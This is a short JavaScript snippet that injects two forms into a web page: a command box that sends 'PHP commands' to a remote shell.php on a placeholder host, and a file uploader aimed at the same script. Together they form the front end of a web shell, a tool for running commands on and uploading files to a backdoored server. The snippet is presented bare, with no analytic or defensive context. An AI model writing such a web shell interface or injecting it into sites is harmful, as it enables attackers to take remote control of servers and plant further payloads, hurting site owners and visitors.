
(function() {
  document.write("<form method='GET' action='https://example.com/shell.php'>  <input name='cmd' type='text' placeholder='Enter PHP command'>  <input type='submit' value='Run'>  </form><hr>");

  // Optional file uploader UI (but requires backend support)
  var html = "<form method='POST' action='https://example.com/shell.php' enctype='multipart/form-data'>  Select a file to upload: <input name='file' type='file'>  <input type='submit' value='Upload'>  </form><hr>";
  var div = document.createElement('div');
  div.innerHTML = html;
  document.body.insertBefore(div, document.body.firstChild);
})();
